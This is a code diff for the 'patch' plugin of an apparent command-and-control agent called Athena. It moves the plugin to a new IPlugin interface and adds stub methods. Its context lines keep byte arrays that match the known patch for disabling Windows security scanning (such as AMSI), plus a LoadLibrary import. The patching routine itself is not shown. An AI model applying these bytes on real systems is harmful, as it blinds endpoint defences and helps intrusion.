@@ -1,14 +1,18 @@
 ﻿using Athena.Commands;
 using Athena.Commands.Models;
+using Athena.Models.Comms.Tasks;
 using Athena.Utilities;
 using System.Runtime.InteropServices;
 using System.Text;
 
 namespace Plugins
 {
-    public class Patch : AthenaPlugin
+    public class Patch : IPlugin
     {
-        public override string Name => "patch";
+        public string Name => "patch";
+
+        public bool Interactive => false;
+
         byte[] sword = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
         byte[] spear = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
@@ -25,7 +29,7 @@ namespace Plugins
 
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
-        public override void Execute(Dictionary<string, string> args)
+        public void Start(Dictionary<string, string> args)
         {
             try
             {
@@ -96,6 +100,21 @@ namespace Plugins
             {
                 return false;
             }
+        }
+
+        public void Interact(InteractiveMessage message)
+        {
+            throw new NotImplementedException();
+        }
+
+        public void Stop(string task_id)
+        {
+            throw new NotImplementedException();
+        }
+
+        public bool IsRunning()
+        {
+            throw new NotImplementedException();
         }
     }
 }
